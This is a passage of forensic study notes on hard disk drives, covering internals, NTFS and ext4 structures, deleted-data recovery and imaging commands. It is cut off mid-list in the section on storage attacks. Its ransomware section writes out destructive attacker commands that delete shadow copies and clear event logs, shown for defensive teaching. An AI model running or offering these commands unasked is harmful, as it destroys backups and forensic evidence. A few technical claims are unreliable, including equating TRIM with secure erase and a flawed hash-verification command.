# Hard Disk Drive (HDD) — Digital Forensics & Cybersecurity Notes

### Digital Forensics Series | Part 3 — Storage Media Deep Dive

> **Series position:** Architecture → Registers → Forensics P1 → Forensics P2 → **HDD (this)**
> **Why this matters:** The majority of forensic investigations involve hard drives. Understanding HDD internals tells you _exactly_ where deleted evidence hides, why data recovery works, how attackers try to destroy evidence, and how magnetic storage creates unique forensic artifacts that flash storage (SSD) does not.
> **Lab targets:** Your own system drives, Metasploitable2, your websites' server storage

---

## Table of Contents

1. [HDD Fundamentals](#1-hdd-fundamentals)
2. [Physical Components — Inside the Drive](#2-physical-components--inside-the-drive)
3. [Platter Structure — Tracks, Sectors, Clusters](#3-platter-structure--tracks-sectors-clusters)
4. [Multi-Platter Architecture](#4-multi-platter-architecture)
5. [How Data Is Written and Read](#5-how-data-is-written-and-read)
6. [HDD vs SSD — Forensic Differences](#6-hdd-vs-ssd--forensic-differences)
7. [File System Layer — How OS Uses HDD](#7-file-system-layer--how-os-uses-hdd)
8. [Where Deleted Data Hides — Forensic Goldmine](#8-where-deleted-data-hides--forensic-goldmine)
9. [HDD Forensic Acquisition](#9-hdd-forensic-acquisition)
10. [Data Recovery Techniques](#10-data-recovery-techniques)
11. [Cybersecurity Attacks Targeting Storage](#11-cybersecurity-attacks-targeting-storage)
12. [Anti-Forensic Techniques on HDD](#12-anti-forensic-techniques-on-hdd)
13. [HDD Forensic Artifacts — What Each Reveals](#13-hdd-forensic-artifacts--what-each-reveals)
14. [Practical Labs](#14-practical-labs)
15. [Physical Evidence Handling for HDDs](#15-physical-evidence-handling-for-hdds)
16. [Quick Reference Tables](#16-quick-reference-tables)

---

## 1. HDD Fundamentals

### What Is a Hard Disk Drive?

```
HDD = Hard Disk Drive
Full form: Hard Disk Drive

Properties:
  ✓ Non-volatile storage — data persists without power
  ✓ Magnetic storage — data encoded as magnetic polarizations
  ✗ Contains movable mechanical parts — physical vulnerability
  ✗ Susceptible to magnetic fields, physical shock, vibration
```

### Non-Volatile vs Volatile — The Forensic Core Distinction

```
RAM (Volatile):       Data DISAPPEARS when power is removed
                      ← Must capture FIRST during live investigation

HDD (Non-Volatile):   Data PERSISTS after power-off
                      ← Primary source of evidence in most investigations
                      ← Even "deleted" data often recoverable

SSD (Non-Volatile):   Similar persistence but very different recovery behavior
                      ← Covered in Section 6
```

### Why HDD Dominates Forensic Cases

- Most crimes committed on laptops/PCs → internal HDD or SSD
- External hard drives used for backup, file storage, data exfiltration
- Server hard drives in RAID arrays contain all company data
- Even as SSDs take over consumer market, HDDs dominate servers
- HDDs are **forensically friendlier** than SSDs — deleted data recoverable much longer

---

## 2. Physical Components — Inside the Drive

### External View

```
┌─────────────────────────────────────────────────────┐
│  HARD DISK DRIVE — EXTERNAL                         │
│                                                     │
│  ┌───────────────────────────────────────┐          │
│  │          METAL CASE (top cover)       │ ←screwed │
│  │  ╔═══════════════════════════════╗   │          │
│  │  ║  Label: model, serial, specs  ║   │          │
│  │  ╚═══════════════════════════════╝   │          │
│  └───────────────────────────────────────┘          │
│                                                     │
│  ┌──────────────────┐  ┌────────────────────┐       │
│  │  SATA Data Port  │  │  SATA Power Port   │       │
│  │  (thin, 7-pin)   │  │  (wider, 15-pin)   │       │
│  └──────────────────┘  └────────────────────┘       │
│                                                     │
│  Back: PCB (Printed Circuit Board)                  │
│    - Motor controller                               │
│    - Read/write amplifier                           │
│    - Cache memory (8MB-256MB)                       │
│    - Firmware chips                                 │
└─────────────────────────────────────────────────────┘
```

### Form Factors

| Form Factor  | Size          | Used In                   | Storage     |
| ------------ | ------------- | ------------------------- | ----------- |
| **3.5 inch** | Full size     | Desktop PCs, servers, NAS | Up to 20TB+ |
| **2.5 inch** | Compact       | Laptops, external drives  | Up to 5TB   |
| **1.8 inch** | Ultra-compact | Old ultrabooks, iPods     | Up to 250GB |

> **Forensic note:** Form factor tells you where the drive came from. A 2.5" drive found loose = laptop drive. A 3.5" = desktop/server. This helps place the device in context at a crime scene.

### Internal Components — Labeled Diagram

```
INSIDE THE HDD (cover removed):

         ┌─────────────────────────────────────────┐
         │                                         │
         │    ┌──────────────────────────┐         │
         │    │   PLATTER (disk)         │         │
         │    │   • Aluminum/glass plate │         │
         │    │   • Coated with magnetic │         │
         │    │     material             │         │
         │    │   • Multiple platters    │         │
         │    │     stacked on spindle   │         │
         │    └──────────┬───────────────┘         │
         │               │                         │
         │          ┌────┴────┐                    │
         │          │ SPINDLE │                    │
         │          │ & MOTOR │ ← rotates platters │
         │          └─────────┘                    │
         │                                         │
         │   ╔══════════════╗                      │
         │   ║  ACTUATOR    ║                      │
         │   ║  ASSEMBLY    ║                      │
         │   ╠══════════════╣                      │
         │   ║ Actuator Arm ║ ← moves head         │
         │   ║ (per platter ║   across tracks      │
         │   ║  surface)    ║                      │
         │   ╠══════════════╣                      │
         │   ║ Read/Write   ║ ← touches platter    │
         │   ║ Head         ║   surface (barely)   │
         │   ╠══════════════╣                      │
         │   ║ Actuator     ║ ← pivot point        │
         │   ║ Axis/Pivot   ║   for arm movement   │
         │   ╚══════════════╝                      │
         │                                         │
         │   Voice Coil Motor (VCM):               │
         │   • Electromagnetic motor               │
         │   • Moves actuator arm precisely        │
         │   • Controlled by PCB                   │
         └─────────────────────────────────────────┘
```

### Component Details

#### Platter (Disk)

- **Material:** Aluminum or glass substrate, coated with ferromagnetic material
- **Coating:** Cobalt-based alloy (stores magnetic patterns)
- **Surface:** Extremely smooth — read/write head flies 3-10nm above (a human hair is ~70,000nm)
- **Both sides store data** — each side has its own read/write head
- **Multiple platters** stacked on the spindle (2-8 typically)
- **Forensic importance:** Data is physically encoded here as magnetic domains — even "deleted" data remains until overwritten

#### Spindle & Motor

- **Spindle:** Metal shaft holding all platters in alignment
- **Motor:** Brushless DC motor rotating the spindle
- **RPM (Revolutions Per Minute):**

| Drive Type       | RPM        | Speed     | Used For                 |
| ---------------- | ---------- | --------- | ------------------------ |
| Consumer laptop  | 5,400 RPM  | Slow      | Budget laptops           |
| Consumer desktop | 7,200 RPM  | Standard  | Most desktop PCs         |
| Enterprise       | 10,000 RPM | Fast      | Servers                  |
| Enterprise SAS   | 15,000 RPM | Very fast | High-performance servers |

```
RPM ↑ = Faster read/write speed = Less time to find data on platter
RPM ↓ = Slower = More seek time = Slower drive

Forensic implication: 15,000 RPM drive images faster than 5,400 RPM
                      Same capacity, significantly different imaging time
```

#### Read/Write Head

- Flies just nanometers above the platter surface (air bearing)
- **Reading:** Detects magnetic polarity changes on the platter surface
- **Writing:** Generates magnetic field to flip the polarity of magnetic domains
- If head **touches** platter surface = **Head Crash** = catastrophic data loss
- One head per platter surface (2 heads per platter, top and bottom)

#### Actuator Assembly

- **Actuator Arm:** Mechanical arm moving the head across tracks
- **Actuator Axis/Pivot:** Pivot point allowing arm to swing across all tracks
- **Voice Coil Motor (VCM):** Electromagnetic motor precisely positioning the arm
- **Forensic note:** If actuator is damaged, the drive cannot read — but data on platters may be intact. Clean room recovery can transplant platters to a working drive.

#### PCB (Printed Circuit Board — Back of Drive)

```
PCB Components:
  ┌─────────────────────────────────────────────┐
  │ • Motor Controller Chip                     │
  │   Controls spindle RPM, actuator movement   │
  │                                             │
  │ • Read/Write Channel Chip                   │
  │   Converts magnetic signals to digital data │
  │                                             │
  │ • Cache Memory (DRAM)                       │
  │   8MB to 256MB buffer for read-ahead/write  │
  │                                             │
  │ • Firmware ROM                              │
  │   Drive's operating system                  │
  │   Contains defect maps, calibration data    │
  │                                             │
  │ • SATA/SAS Interface Controller             │
  │   Handles communication with host system    │
  └─────────────────────────────────────────────┘
```

**Security note on PCB:** The drive's firmware (on PCB) can be compromised:

- **Evil Maid / HDD firmware attack (Equation Group):** NSA-linked malware that reprograms HDD firmware to hide malware in hidden sectors — survives OS reinstall, full format, even repartitioning.

---

## 3. Platter Structure — Tracks, Sectors, Clusters

This is the **most important section for data recovery**. Understanding how data is physically organized on the platter directly explains why deleted files are recoverable.

### Visual Structure of a Platter

```
PLATTER (top view — one side):

                  ┌─────────────────────────────────┐
                  │          OUTER EDGE              │
                  │    ┌─────────────────────┐       │
                  │    │  Track 0 (outermost)│       │
                  │    │  ┌───────────────┐  │       │
                  │    │  │  Track 1      │  │       │
                  │    │  │  ┌─────────┐  │  │       │
                  │    │  │  │Track 2  │  │  │       │
                  │    │  │  │  ...    │  │  │       │
                  │    │  │  └─────────┘  │  │       │
                  │    │  └───────────────┘  │       │
                  │    └─────────────────────┘       │
                  │         CENTER (spindle)          │
                  └─────────────────────────────────┘

ZOOM IN — One section of the platter:
         ← TRACK (complete circle) →
         ┌──────────────────────────────────────────┐
Track N  │ Sector │ Sector │ Sector │ Sector │ Sect │
         │   1    │   2    │   3    │   4    │  5   │
         └──────────────────────────────────────────┘
         ┌──────────────────────────────────────────┐
Track N+1│ Sector │ Sector │ Sector │ Sector │ Sect │
         └──────────────────────────────────────────┘

CLUSTER = Multiple consecutive sectors (unit of file allocation)
         │◄────── CLUSTER (e.g., 4 sectors) ──────►│
         ┌──────────────────────────────────────────┐
         │ Sector │ Sector │ Sector │ Sector │      │
         │   1    │   2    │   3    │   4    │      │
         └──────────────────────────────────────────┘
```

### Tracks

```
TRACK:
  • Complete circular path on one platter surface
  • Numbered from outside edge (Track 0) to center (Track N)
  • Track 0 = outermost = where data starts
  • Each platter has thousands of tracks (modern drives: 100,000+)
  • Width: ~100nm wide, ~100nm apart

Analogy: Like lanes on a circular running track
         Each lane = one track
         Runner = read/write head
```

### Sectors

```
SECTOR:
  • Smallest addressable unit on a platter
  • Fixed size: traditionally 512 bytes
                modern drives: 4096 bytes (4K sectors, "Advanced Format")
  • Each sector contains:
    - Sync field (alignment)
    - Address information (sector header)
    - Data field (512 or 4096 bytes of actual data)
    - Error Correction Code (ECC)
    - Gap

Analogy: Like individual parking spaces on a circular parking lot

FORENSIC IMPORTANCE:
  When a file is "deleted," its sectors are NOT erased.
  They are just marked as "available for reuse."
  Until overwritten by new data, the deleted file's data is
  still physically present in those sectors!
  → This is why forensic tools recover deleted files.
```

### Clusters

```
CLUSTER (Allocation Unit):
  • The minimum unit of space a file system assigns to a file
  • Contains multiple consecutive sectors
  • Typical sizes: 4KB (most common), 8KB, 16KB, 32KB, 64KB
  • Size depends on: file system type + volume size

Cluster size: 4KB = 8 sectors × 512 bytes
              4KB = 1 sector × 4096 bytes (4K drives)

WHY CLUSTERS MATTER FOR FORENSICS:
  If a file is only 1 byte:
    → OS allocates one full cluster (e.g., 4KB) to it
    → 1 byte stored, 4095 bytes of cluster UNUSED
    → Those 4095 bytes = SLACK SPACE
    → Slack space may contain fragments of PREVIOUS files!
    → Forensic goldmine for file fragments
```

### Cylinder

```
CYLINDER:
  • Same track number across all platter surfaces
  • Example: Track 5 on platter 1 top + Track 5 on platter 1 bottom
             + Track 5 on platter 2 top + Track 5 on platter 2 bottom
             = Cylinder 5
  • All heads move together → accessing same cylinder = no head movement needed
  • OS tries to store related data in same cylinder for speed
```

### CHS Addressing (Historical) vs LBA (Modern)

```
CHS (Cylinder-Head-Sector) — Old method:
  Address = [Cylinder Number, Head Number, Sector Number]
  Limitation: Max 8.4GB addressable (obsolete)

LBA (Logical Block Addressing) — Current method:
  Address = single linear number (0, 1, 2, 3... N)
  OS sees drive as flat array of sectors
  LBA 0 = first sector (MBR or GPT header)
  Allows drives of any size
  Modern drives: up to 2^48 LBA = 128 PetaBytes

FORENSIC RELEVANCE:
  dd reads raw sectors via LBA
  Forensic tools map LBA addresses back to files
  Deleted file: LBA still contains data, just not in directory
```

---

## 4. Multi-Platter Architecture

### How Multiple Platters Are Organized

```
MULTI-PLATTER HDD (side view):

         Head 0 ──────────────────────────────┐
         ─────────────────────────────── Platter 0 (top surface)
         Head 1 ─────────────────────────────┐│
         ─────────────────────────────── Platter 0 (bottom surface)
                                              ││
         Head 2 ─────────────────────────────┘│
         ─────────────────────────────── Platter 1 (top surface)
         Head 3 ──────────────────────────────┘
         ─────────────────────────────── Platter 1 (bottom surface)

         [Spindle connects all platters — they all rotate together]

         All actuator arms connected — they all move together
         Head 0 and Head 1 always at same track number but different surfaces
```

### Addressing a Specific Data Location

To read any piece of data, the HDD needs to know:

```
1. WHICH PLATTER and WHICH SURFACE → determines which head to use
2. WHICH TRACK → determines how far to move actuator arm
3. WHICH SECTOR → wait for rotation to bring sector under head

Total time = Seek time (arm movement) + Rotational latency + Transfer time

Typical values:
  Seek time:          3-15ms
  Rotational latency: 2-8ms (depends on RPM)
  Transfer rate:      100-200 MB/s (sequential)

FORENSIC IMPLICATION:
  Sequential reads (whole drive imaging) are fastest
  Random reads (jumping between sectors) are slow
  Fragmented files = lots of random reads = slow forensic analysis
```

---

## 5. How Data Is Written and Read

### Writing Data (Magnetic Encoding)

```
BINARY DATA → MAGNETIC DOMAINS:

Bit 1 → Magnetic domain pointing ← (one direction)
Bit 0 → Magnetic domain pointing → (opposite direction)

Write Process:
  1. PCB receives data from computer
  2. Data passes through write channel (converts bits to magnetic signal)
  3. Write head passes over platter at nanometer distance
  4. Current flows through write coil in head
  5. Magnetic field generated flips ferromagnetic coating
  6. Pattern of polarity changes = encoded bits

This magnetic encoding is what makes forensics possible:
  → Partial magnetic residue may remain after overwriting
  → Multiple overwrites needed to truly erase data
  → Single overwrite with zeros ≠ forensically clean
```

### Reading Data

```
Read Process:
  1. Platter rotates under read head
  2. Read element (magnetoresistive sensor) detects polarity changes
  3. Polarity transitions → electrical signal → binary data
  4. Amplified, decoded by read channel chip
  5. ECC (Error Correction Code) checks and fixes errors
  6. Corrected data sent to computer via SATA interface

ECC (Error Correction Code):
  • Every sector has ECC data appended
  • Can correct small numbers of bit errors automatically
  • If too many errors → read failure → "bad sector"
  • Forensic tools handle bad sectors specially (fill with zeros/pattern)
```

### SATA Interface and Cable

```
SATA (Serial ATA):
  • Current standard for consumer/enterprise HDDs
  • Data cable: 7-pin, max 1 meter
  • Power cable: 15-pin (3.3V, 5V, 12V)
  • Transfer speeds:
    SATA I:   1.5 Gbps (150 MB/s)
    SATA II:  3.0 Gbps (300 MB/s)
    SATA III: 6.0 Gbps (600 MB/s) ← most common today

SAS (Serial Attached SCSI):
  • Enterprise drives
  • Dual-port (redundancy)
  • Better error handling
  • 6Gbps, 12Gbps speeds

USB External Drives:
  • SATA drive inside a USB enclosure
  • USB 3.0: 5Gbps
  • USB 3.2 Gen 2: 10Gbps

FORENSIC NOTE:
  Write blockers exist for SATA, SAS, USB, IDE
  Always use the correct write blocker for the interface
```

---

## 6. HDD vs SSD — Forensic Differences

This section is critical — SSDs behave very differently from HDDs in forensic investigations.

### Side-by-Side Comparison

| Feature                      | HDD                                          | SSD                                    |
| ---------------------------- | -------------------------------------------- | -------------------------------------- |
| Storage method               | Magnetic (platters)                          | Electrical charge (NAND flash cells)   |
| Moving parts                 | Yes (platter, actuator arm)                  | No — purely electronic                 |
| Physical shock vulnerability | HIGH — drop can destroy                      | LOW — no moving parts                  |
| Read/write speed             | 100-200 MB/s                                 | 500-7000 MB/s                          |
| Deleted file recovery        | **EXCELLENT** — data stays until overwritten | **POOR** — TRIM may erase immediately  |
| Overwrite needed to erase    | 1-7 overwrites (debate ongoing)              | N/A — TRIM handles it                  |
| Forensic imaging time        | Slower                                       | Much faster                            |
| Magnetic degaussing          | **Works** — destroys all data                | **Does NOT work** — electrical storage |
| Anti-static precautions      | Required (magnetic components)               | Required (electronics)                 |
| Evidence longevity           | Years in proper storage                      | Shorter — charge may leak              |
| Slack space                  | Present and recoverable                      | May be erased by TRIM                  |

### TRIM — The Forensic Enemy

```
TRIM (ATA Secure Erase by OS notification):

Without TRIM (HDD behavior):
  File deleted → OS removes directory entry
  Sectors marked "available" → Data still there!
  Forensic tool reads sectors → File RECOVERED

With TRIM (SSD behavior):
  File deleted → OS removes directory entry
  OS sends TRIM command to SSD controller
  SSD controller erases those pages IMMEDIATELY
  (because SSDs can't write to dirty pages without erasing)
  Forensic tool reads pages → EMPTY (zeros or random data)
  → File NOT recoverable!

Windows: TRIM enabled by default on SSDs since Windows 7
Linux:   TRIM enabled if mounted with 'discard' option or via fstrim cron
macOS:   TRIM enabled on Apple SSDs since OS X 10.10.4
```

### SSD Internal Structure (for context)

```
SSD stores data in NAND Flash cells:

Each cell stores:
  SLC (Single Level Cell): 1 bit  → most durable, expensive
  MLC (Multi-Level Cell):  2 bits → consumer standard
  TLC (Triple Level Cell): 3 bits → high capacity, lower durability
  QLC (Quad Level Cell):   4 bits → highest capacity, lowest durability

Wear Leveling:
  SSDs distribute writes evenly across all cells
  Prevents any one cell from wearing out first
  Forensic implication: data may be in unexpected physical locations
  Logical address ≠ physical address on SSD
```

---

## 7. File System Layer — How OS Uses HDD

The file system is the layer between the OS and raw HDD sectors. Understanding it is essential for forensic data recovery.

### File System Types and Forensic Tools

| File System | OS                    | Forensic Notes                                      |
| ----------- | --------------------- | --------------------------------------------------- |
| **NTFS**    | Windows (Vista+)      | Rich metadata: $MFT, $LogFile, $USNJrnl, timestamps |
| **FAT32**   | Windows, cameras, USB | Simple, easy to parse, less metadata                |
| **exFAT**   | Windows, USB, SD      | Minimal metadata, used in flash storage             |
| **ext4**    | Linux                 | Journal, inode table, rich forensic artifacts       |
| **APFS**    | macOS (2017+)         | Snapshots, clones, rich timeline data               |
| **HFS+**    | macOS (older)         | Resource forks, rich metadata                       |
| **UFS**     | BSD/old Unix          | Inodes, superblock                                  |

### NTFS Deep Dive (Most Common in Forensics)

```
NTFS KEY STRUCTURES:

$MFT (Master File Table):
  • Database of every file and directory on the volume
  • Every file has one MFT entry (at minimum)
  • MFT entry contains: filename, timestamps (4 per file!),
    file size, attributes, data location (runs)
  • When file deleted: MFT entry marked as "available"
    but content remains until entry is reused
  • Forensic gold: recover MFT → recover file metadata even
    if data is overwritten

$LogFile:
  • Transactional log of NTFS operations
  • Rollback capabilities after crashes
  • Forensic gold: shows recent file create/modify/delete operations
    even if the files themselves are gone

$USNJrnl (Update Sequence Number Journal):
  • Records every file system change with timestamp
  • Change reasons: FileCreate, FileDelete, DataOverwrite, etc.
  • Can show files that were created AND deleted in same session
  • Often survives even after attacker deletes files

$Recycle.Bin:
  • Deleted files moved here (if deleted via Windows Explorer)
  • Contains: original path, original filename, deletion time
  • INFO2 file (old) / $I files (Vista+): metadata about deleted files
  • $R files: actual file content
  • Attacker using Shift+Delete bypasses Recycle Bin!

Volume Shadow Copy (VSS):
  • Windows automatic backup points
  • Stored in System Volume Information
  • May contain previous versions of files attacker "deleted"
  • Ransomware ALWAYS deletes shadow copies first (vssadmin delete shadows)
  • Forensically: shadow copies accessed via:
    vssadmin list shadows
    mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

### ext4 Deep Dive (Linux)

```
ext4 KEY STRUCTURES:

Superblock:
  • Volume metadata: total blocks, block size, filesystem state
  • Inode count, free inodes
  • Last mount time, last write time
  • Forensic: timestamps show when filesystem was last used

Inode Table:
  • Each file/directory has an inode number
  • Inode contains: file size, timestamps (ctime, mtime, atime),
    permissions, owner, group, data block pointers
  • When file deleted: inode marked as available
    but data blocks still contain old content!

Journal (/dev/sda1: journal block device):
  • Records filesystem transactions
  • Forensic: journal may contain traces of deleted operations

Directory Entries:
  • Map filenames to inode numbers
  • When deleted: directory entry marked available
    but inode and data blocks remain
  • Tools like Sleuth Kit's ils, icat recover these
```

---

## 8. Where Deleted Data Hides — Forensic Goldmine

This is the core reason forensic investigators can recover what attackers think they deleted.

### The Deletion Process — What Really Happens

```
USER ACTION: Delete a file (e.g., "evidence.docx")
              ↓
FILE SYSTEM RESPONSE:
  Step 1: Remove filename from directory (file becomes invisible)
  Step 2: Mark inode as available (NTFS: MFT entry available)
  Step 3: Mark data clusters as "free" (available for reuse)

WHAT DOES NOT HAPPEN:
  ✗ Data is NOT erased from the sectors
  ✗ Magnetic domains are NOT altered
  ✗ Nothing is written to the sectors at all

RESULT:
  • OS no longer sees the file (it's "deleted" from OS perspective)
  • Data still physically present on platter sectors
  • Remains there until new data is written to those sectors
  • May persist for days, weeks, months, years without overwriting
```

### Five Locations Where Deleted Evidence Survives

```
┌─────────────────────────────────────────────────────────────────┐
│  LOCATION 1: UNALLOCATED SPACE                                  │
│  ────────────────────────────                                   │
│  What: Sectors marked "free" after file deletion                │
│  Contains: Complete files not yet overwritten                   │
│  Recovery: PhotoRec, Foremost, Autopsy (file carving)           │
│  Duration: Until overwritten (could be years on large drives)   │
├─────────────────────────────────────────────────────────────────┤
│  LOCATION 2: FILE SLACK SPACE                                   │
│  ──────────────────────────────                                 │
│  What: Unused space at end of last cluster allocated to a file  │
│  Example: File = 3KB, cluster = 4KB → 1KB slack space          │
│  Contains: Fragments of PREVIOUS files that occupied this space │
│  Recovery: Tools extract slack space automatically              │
│  Duration: Until cluster is reused                              │
├─────────────────────────────────────────────────────────────────┤
│  LOCATION 3: VOLUME SLACK                                       │
│  ─────────────────────────                                      │
│  What: Space between end of file system and end of partition    │
│  Contains: Data from before current partition was created       │
│  Recovery: Analyze raw sectors beyond last partition entry      │
├─────────────────────────────────────────────────────────────────┤
│  LOCATION 4: FILE SYSTEM METADATA (MFT / Inodes)               │
│  ───────────────────────────────────────────────                │
│  What: $MFT entries (NTFS) or inodes (ext4) of deleted files   │
│  Contains: Filename, timestamps, file size, last known location │
│  Recovery: istat, ils (Sleuth Kit), Autopsy                     │
│  Duration: Until MFT entry is reused for new file               │
├─────────────────────────────────────────────────────────────────┤
│  LOCATION 5: SWAP SPACE / PAGEFILE                              │
│  ──────────────────────────────────                             │
│  What: Virtual memory overflow area (pagefile.sys / swapfile)   │
│  Contains: RAM contents paged to disk (passwords, docs, etc.)   │
│  Recovery: Volatility can analyze pagefiles, strings extraction │
│  Duration: Until overwritten (Windows keeps pagefile between    │
│             reboots unless cleared)                              │
└─────────────────────────────────────────────────────────────────┘
```

### File Carving — Finding Deleted Files Without Metadata

```
FILE CARVING:
  Searches raw sectors for file signatures (magic bytes)
  No need for file system metadata (which may be deleted)
  Works even if file system is damaged or encrypted

File Signatures (Magic Bytes):
  ┌─────────────────────────────────────────────────────┐
  │ File Type │ Magic Bytes (hex)    │ Extension        │
  ├─────────────────────────────────────────────────────┤
  │ JPEG      │ FF D8 FF E0          │ .jpg .jpeg       │
  │ PNG       │ 89 50 4E 47          │ .png             │
  │ PDF       │ 25 50 44 46          │ .pdf             │
  │ ZIP       │ 50 4B 03 04          │ .zip .docx .xlsx │
  │ MP4       │ 00 00 00 XX 66 74 79 │ .mp4             │
  │ EXE/DLL   │ 4D 5A (MZ)           │ .exe .dll        │
  │ ELF       │ 7F 45 4C 46          │ Linux executable │
  │ SQLite DB │ 53 51 4C 69 74 65    │ .db .sqlite      │
  │ Office    │ D0 CF 11 E0          │ .doc .xls .ppt   │
  └─────────────────────────────────────────────────────┘

Tools:
  foremost -t all -i disk.img -o /recovered/     # Carve all file types
  photorec disk.img                               # Interactive, GUI version
  scalpel -c /etc/scalpel.conf disk.img           # Faster, configurable
  binwalk -e disk.img                             # Also extracts compressed files
```

---

## 9. HDD Forensic Acquisition

### Write Blocker Setup (Critical Step)

```
Hardware Write Blocker:
  Evidence HDD → [WRITE BLOCKER] → Forensic PC

Popular hardware write blockers:
  • Tableau T35u3 (SATA/IDE → USB 3.0)
  • WiebeTech Forensic UltraDock v5 (SATA → USB/Thunderbolt)
  • Logicube Ditto (field-portable, standalone)
  • Wiebetech USB WriteBlocker (for USB drives)

Software Write Blocker (Linux — when hardware unavailable):
  sudo blockdev --setro /dev/sdb     # Block all writes to device
  hdparm -r1 /dev/sdb               # Alternative read-only flag
```

### Imaging Commands

```bash
# ─────────────────────────────────────────────────────
# METHOD 1: dd (basic, built-in, no hash)
# ─────────────────────────────────────────────────────
sudo dd if=/dev/sdb of=/evidence/case001.img \
     bs=512 \
     conv=noerror,sync \
     status=progress

# bs=512:            Read/write 512 bytes at a time (match sector size)
# conv=noerror:      Continue on read errors (bad sectors)
# conv=sync:         Fill bad sectors with zeros (preserves sector alignment)
# status=progress:   Show progress

# ─────────────────────────────────────────────────────
# METHOD 2: dcfldd (dd + hash, designed for forensics)
# ─────────────────────────────────────────────────────
sudo dcfldd if=/dev/sdb \
     of=/evidence/case001.img \
     hash=sha256,md5 \
     hashlog=/evidence/case001_hash.log \
     hashconv=after \
     bs=512 \
     conv=noerror,sync \
     statusinterval=100

# Generates both SHA256 and MD5 automatically during imaging!

# ─────────────────────────────────────────────────────
# METHOD 3: dc3dd (DoD-approved forensic imaging)
# ─────────────────────────────────────────────────────
sudo dc3dd if=/dev/sdb \
     of=/evidence/case001.img \
     hash=sha256 \
     log=/evidence/case001_dc3dd.log \
     rec=on     # recover on error

# ─────────────────────────────────────────────────────
# METHOD 4: FTK Imager (CLI version)
# ─────────────────────────────────────────────────────
# ftkimager /dev/sdb /evidence/case001 --e01 --outpass "" --verify

# Creates .E01 format (compressed, with embedded hash, court-standard)

# ─────────────────────────────────────────────────────
# VERIFY IMAGE INTEGRITY
# ─────────────────────────────────────────────────────
sha256sum /evidence/case001.img > /evidence/verify.txt
sha256sum /dev/sdb              >> /evidence/verify.txt
diff <(head -c 64 /evidence/verify.txt) <(tail -c 64 /evidence/verify.txt)
# Both hashes must match!
```

### Imaging Speed Estimates

| Drive Size | SATA III  | USB 3.0  | USB 2.0    |
| ---------- | --------- | -------- | ---------- |
| 500 GB     | ~45 min   | ~30 min  | ~7 hours   |
| 1 TB       | ~90 min   | ~1 hour  | ~14 hours  |
| 4 TB       | ~6 hours  | ~4 hours | ~55 hours  |
| 8 TB       | ~12 hours | ~8 hours | ~110 hours |

> **Tip:** Always use direct SATA connection via write blocker — never USB 2.0 if avoidable. A dead laptop? Remove the drive and connect via write blocker directly.

---

## 10. Data Recovery Techniques

### Level 1: Logical Recovery (No Physical Damage)

```bash
# Recover deleted files from forensic image using Autopsy:
autopsy &
# Create new case → Add disk image → Run ingest:
# [x] Recent Activity
# [x] Deleted Files
# [x] File Type Identification
# [x] Keyword Search
# → Results: Deleted files tab shows all recoverable files

# Command-line recovery with Sleuth Kit:
# 1. List all files including deleted:
fls -r -d /evidence/case001.img       # -r recursive, -d show deleted

# 2. Get inode of deleted file:
fls -r /evidence/case001.img | grep "evidence.docx"
# Output: d/d * 12345: evidence.docx    ← inode 12345, * = deleted

# 3. Recover the file using inode:
icat /evidence/case001.img 12345 > /recovered/evidence.docx

# 4. Verify recovered file:
file /recovered/evidence.docx    # Check file type
sha256sum /recovered/evidence.docx
```

### Level 2: File Carving (Metadata Deleted)

```bash
# When directory entry AND inode are both overwritten:
# Only option is carving by file signature

# Foremost (fastest for specific file types):
foremost -t jpg,pdf,doc,zip -i /evidence/case001.img -o /recovered/

# PhotoRec (more file types, interactive):
photorec /evidence/case001.img
# → Select partition → Select file types → Select output directory

# Scalpel (configurable, fast):
cp /etc/scalpel/scalpel.conf /tmp/scalpel.conf
# Uncomment file types you want in /tmp/scalpel.conf
scalpel -c /tmp/scalpel.conf /evidence/case001.img -o /recovered/

# After carving:
ls /recovered/    # Organized by file type
# jpg-0-0/        # All carved JPEGs
# pdf-0-0/        # All carved PDFs
# zip-0-0/        # All carved ZIPs (may contain docx/xlsx inside!)
```

### Level 3: Physical Recovery (Hardware Damaged)

```
SCENARIO: HDD won't spin up / clicking noise / burnt PCB

PCB Swap:
  Same make, model, firmware version PCB from donor drive
  Swap PCB → drive may become readable
  Caution: Modern drives have drive-specific calibration on PCB chip
           May need ROM chip transplant too

Head Replacement (Clean Room required):
  Damaged read/write head causes clicking noise (head crash)
  Replace head assembly from identical donor drive
  Must be done in Class 100 cleanroom (particles destroy drive)
  Professional service: $500-$3000+ depending on damage

Platter Transplant:
  If entire drive is physically damaged
  Remove platters and install in working drive with same head count
  Extremely delicate — very high failure rate if done wrong

Forensic recovery services:
  DriveSavers, Ontrack, Seagate Recovery Services
  Can recover from fire, water, physical damage
  Cost: $300-$1500+ per drive

Evidence implication:
  If attacker physically destroyed drive: platters may still be readable
  Fire doesn't fully magnetize platters — residual data often recoverable
  Water damage: rinse with deionized water, dry, attempt recovery
```

---

## 11. Cybersecurity Attacks Targeting Storage

### Ransomware — Storage Attack Pattern

```
RANSOMWARE ATTACK ON HDD:

Phase 1: Delivery (phishing email, RDP brute force, etc.)
Phase 2: Execution (malware runs)
Phase 3: Reconnaissance (enumerate drives, network shares)
Phase 4: Exfiltration (copy data out BEFORE encrypting — double extortion)
Phase 5: Anti-forensic preparation:
         → Delete shadow copies:
           vssadmin delete shadows /all /quiet
           wmic shadowcopy delete
         → Clear event logs:
           wevtutil cl Security
           wevtutil cl System
Phase 6: Encryption (AES-256 key generated, files encrypted)
Phase 7: Ransom note dropped (README.txt, HOW_TO_DECRYPT.html)
Phase 8: Key destroyed (no decryption possible without paying)

FORENSIC ARTIFACTS REMAINING:
  ✓ Encrypted files (extension changed: .locked, .WNCRY, .crypt)
  ✓ Ransom note files (found via file carving even if deleted)
  ✓ VSS deletion logged in event log BEFORE clearing (Event ID 524)
  ✓ Malware binary in Prefetch (even after deletion)
  ✓ Registry Run keys (if persistence was set up)
  ✓ Network connections in RAM dump (C2 server IP)
  ✓ Encryption key MAY be in RAM if captured before shutdown
```

### Data Exfiltration via Storage

```
Methods attackers use to exfiltrate data from HDDs:

1. USB Drive Copy:
   Evidence: Windows USB artifact locations:
   • HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR (device registry)
   • C:\Windows\inf\setupapi.dev.log (installation log)
   • LNK files showing files accessed from USB path
   • Shellbags showing USB directory browsing

2. Cloud Upload (Dropbox, Google Drive, OneDrive):
   Evidence:
   • Browser history showing large uploads
   • Cloud sync client logs
   • Network traffic (large outbound to cloud IPs)

3. Email Attachment:
   Evidence:
